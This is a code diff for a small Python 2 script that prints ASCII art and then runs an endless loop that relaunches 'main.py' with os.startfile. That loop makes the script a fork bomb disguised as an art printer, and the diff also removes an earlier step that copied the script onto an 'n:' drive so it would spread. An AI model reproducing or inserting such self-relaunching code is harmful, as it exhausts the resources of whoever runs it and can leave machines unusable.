@@ -5,15 +5,7 @@ Created on 7 Dec 2015
 '''
 
 import os
-import shutil
 
-
-
-directory = os.getcwd() + '\main.py'
-
-if directory != 'n:/main.py':
-    shutil.copyfile(directory, 'n:/main.py')
-    
 
 print "                        ___"
 print "                     .-'   `'."
@@ -35,5 +27,5 @@ print "         (/`    ( (`          ) )  '-;"
 print "             `      '-;         (-'"
     
 while True:
-    os.startfile('n:/main.py')
+    os.startfile('main.py')
    
